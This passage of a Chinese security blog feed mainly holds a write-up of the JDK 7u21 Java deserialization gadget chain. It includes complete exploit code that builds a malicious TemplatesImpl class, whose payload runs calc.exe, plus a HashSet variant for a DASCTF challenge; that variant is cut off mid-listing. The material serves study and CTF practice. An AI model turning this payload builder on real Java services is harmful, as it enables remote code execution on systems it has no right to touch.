class=&quot;identifier&quot;&gt;JSON&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;parse&lt;span class=&quot;literal&quot;&gt;()&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//解析为JSONObject类型或者JSONArray类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VO vo = &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;JSON&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;parse&lt;span class=&quot;constructor&quot;&gt;Object(&lt;span class=&quot;string&quot;&gt;&quot;&amp;#123;...&amp;#125;&quot;&lt;/span&gt;)&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//JSON文本解析成JSONObject类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VO vo = &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;JSON&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;parse&lt;span class=&quot;constructor&quot;&gt;Object(&lt;span class=&quot;string&quot;&gt;&quot;&amp;#123;...&amp;#125;&quot;&lt;/span&gt;, VO.&lt;span class=&quot;params&quot;&gt;class&lt;/span&gt;)&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//JSON文本解析成VO.class类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;pom.xml&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.alibaba&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;fastjson&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.2.24&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jdk7u21 Gadget Chain</title>
    <link href="https://jlkl.github.io/2021/08/21/Java_05/"/>
    <id>https://jlkl.github.io/2021/08/21/Java_05/</id>
    <published>2021-08-21T12:08:10.000Z</published>
    <updated>2021-08-21T12:19:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中</p><p><strong>影响版本：</strong></p><ul><li>JDK &lt;= 7u21</li></ul><p><strong>测试环境：</strong></p><ul><li>JDK 7u21</li></ul><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要添加javassist依赖</p><a id="more"></a><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">  <span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>add<span class="literal">()</span></span><br><span class="line">    ...</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>hash<span class="constructor">Code()</span> (X)</span><br><span class="line">  <span class="module-access"><span class="module"><span class="identifier">LinkedHashSet</span>.</span></span>add<span class="literal">()</span></span><br><span class="line">    ...</span><br><span class="line">      <span class="constructor">Proxy(Templates)</span>.hash<span class="constructor">Code()</span> (X)</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span> (X)</span><br><span class="line">          <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>hash<span class="constructor">CodeImpl()</span> (X)</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span>hash<span class="constructor">Code()</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>member<span class="constructor">ValueHashCode()</span> (X)</span><br><span class="line">              <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>hash<span class="constructor">Code()</span> (X)</span><br><span class="line">      <span class="constructor">Proxy(Templates)</span>.equals<span class="literal">()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">          <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>equals<span class="constructor">Impl()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">              ...</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">OutputProperties()</span></span><br><span class="line">                  <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span><span class="keyword">new</span><span class="constructor">Transformer()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">TransletInstance()</span></span><br><span class="line">                      <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>define<span class="constructor">TransletClasses()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">ClassLoader</span>.</span></span>define<span class="constructor">Class()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;<span class="literal">()</span></span><br><span class="line">                              ...</span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>入口点是在LinkedHashSet的readObject，又因为继承了HashSet，即HashSet的readObject</p><p><img src="/2021/08/21/Java_05/20210821152925.png" alt="image-20210821152916574"></p><p>关注<code>map.put</code>，PRESENT是一个空的object变量，跟进，大概逻辑为判断key的hash值是否和已有的相等，然后添加进value</p><p><img src="/2021/08/21/Java_05/20210821153216.png" alt="image-20210821153215114"></p><p>注意<code>key.equals(k)</code>，这里使用动态代理来拓展供给面，我们知道动态代理最终的调用是Handler的invoke函数实现的。这里使用的是AnnotationInvocationHandler这个动态代理handler，查看它的invoke实现</p><p><img src="/2021/08/21/Java_05/20210821154340.png" alt="image-20210821154338726"></p><p>方法名为equal时最后调用equalsImpl，跟进</p><p><img src="/2021/08/21/Java_05/20210821162517.png" alt="image-20210821162516121"></p><p>关注<code>var8 = var5.invoke(var1)</code>这个反射调用，跟进getMemberMethods</p><p><img src="/2021/08/21/Java_05/20210821162705.png" alt="image-20210821162703442"></p><p>equalsImpl这个函数功能大概明了了，从<code>this.type</code>获取类声明的函数，然后循环执行，type在构造函数这里可控</p><p><img src="/2021/08/21/Java_05/20210821162854.png" alt="image-20210821162852684"></p><p>这里用到了cc2的TemplatesImpl，详细可以参考 <a href="https://jlkl.github.io/2021/04/13/Java_04/">URLDNS&amp;Commons Collections 1-7</a>，这个类只有两个方法</p><p><img src="/2021/08/21/Java_05/20210821163343.png" alt="image-20210821163340588"></p><p>newTransformer方法最后会从字节码实例化恶意类从而执行其静态代码块的恶意代码</p><p><strong>如何构造满足条件的hash值？</strong></p><p>那么怎么才能执行<code>key.equals(k)</code>，回到<code>map.put</code>的实现</p><p><img src="/2021/08/21/Java_05/20210821153216.png" alt="image-20210821153215114"></p><p>首先第一次调用<code>map.put()</code>时传入的参数e是我们封装了恶意代码的TemplatesImpl对象，另一个参数就是一个空的Object对象</p><p><img src="/2021/08/21/Java_05/20210821172349.png" alt="image-20210821172348046"></p><p>继续put的实现，hash会调用对象本身的hashcode方法，indexFor方法则是会根据计算出的hashcode返回hash索引。第一次调用时table为空，那么就不会进入for循环。addEntry会将key添加进table，包含其hashcode还有hash索引。</p><p>那么考虑第二次调用的时候要进入for循环需要根据hashcode计算出的hash索引和第一次传入的TemplatesImpl对象相同。第二次传入的是AnnotationInvocationHandler对象，那么如何让这两个类型都不同的对象计算出的hashcode是相同的呢？</p><p>AnnotationInvocationHandler是动态代理的handler，调用其hashcode，最终调用hashCodeImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>var3遍历memberValues存储的键值对，然后var1为hashcode值，memberValues构造时可控</p><p><img src="/2021/08/21/Java_05/20210821174519.png" alt="image-20210821174517896"></p><p>那么让memberValues的第一个键值对的值为封装了恶意代码的TemplatesImpl对象，然后关键就是</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var<span class="number">1</span> += <span class="number">127</span> * <span class="comment">((String)</span>var<span class="number">3.</span>getKey<span class="comment">()</span>).hashCode<span class="comment">()</span> ^ memberValueHashCode<span class="comment">(var3.getValue()</span>)</span><br></pre></td></tr></table></figure><p>看第一次循环，<code>memberValueHashCode(var3.getValue()</code>的值即为封装了恶意代码的TemplatesImpl对象的hashcode，因为0和任何数异或的结果都是那个数，那么只需要<code>((String)var3.getKey()).hashCode()</code>即key的hashcode为0就可以保证循环结束后返回的hashcode值一直为装了恶意代码的TemplatesImpl对象的hashcode，这里<code>f5a5a608</code>字符串的hashcode为0</p><p>for循环过后</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">e</span>.hash == hash <span class="symbol">&amp;&amp;</span> ((<span class="name">k</span> = e.key) == key || key.equals(<span class="name">k</span>)))</span><br></pre></td></tr></table></figure><p>因为<code>&amp;&amp;</code>和<code>||</code>有短路效果，需要满足 <code>e.hash == hash</code> 和 <code>(k = e.key) != key</code> 才会执行 <code>key.equals(k)</code></p><p>第二次put传入代理对象时，<code>e.hash</code>为封装了恶意代码的TemplatesImpl对象的hashcode，我们上面已经做了处理，代理对象返回的hashcode必然和 <code>e.hash</code>相等。同时此时k为代理对象，而 <code>e.key</code> 为TemplatesImpl对象，必然不相同</p><p><strong>利用思路：</strong></p><ol><li>构造恶意TemplatesImpl</li><li>实例化一个HashMap，并添加keyf5a5a608，恶意构造好的TemplatesImpl加入到map中</li><li>利用反射实例化AnnotationInvocationHandler类，传入map</li><li>创建一个AnnotationInvocationHandler对象为handler的动态代理</li><li>实例化HashSet，并将TemplatesImpl和设置的代理这两个对象放进去</li></ol><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建恶意class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        ((CtClass) cc).makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"> </span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"> </span><br><span class="line">        String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor handlerConstructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handlerConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(App.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        HashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(set);</span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 jdk &gt; 7u21 的版本，修复了这个漏洞，<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 方法增加了异常抛出，导致反序列化失败</p><p><img src="/2021/08/21/Java_05/20210821180322.png" alt="image-20210821180320677"></p><h2 id="DASCTF-July-easyjava"><a href="#DASCTF-July-easyjava" class="headerlink" title="DASCTF July easyjava"></a>DASCTF July easyjava</h2><p>禁止序列化LinkedHashSet类</p><p><img src="/2021/08/21/Java_05/20210821195829.png" alt="image-20210821195827791"></p><p>序列化父类HashSet即可，当然这里肯定有其他解法</p><p>HashSet和LinkedHashSet区别在于，LinkedHashSet里数据的下标和我们插入时的顺序一样，而HashSet<strong>不保证有序</strong></p><p><a href="https://www.zhihu.com/question/28414001" target="_blank" rel="noopener">https://www.zhihu.com/question/28414001</a></p><p>payload多打几次就可以了，实在不行交换proxy和templates的add顺序再多打几次</p><p><strong>Jdk7u21 HashSet版本</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建恶意class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        ((CtClass) cc).makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"> </span><br><span class="line">        TemplatesImpl 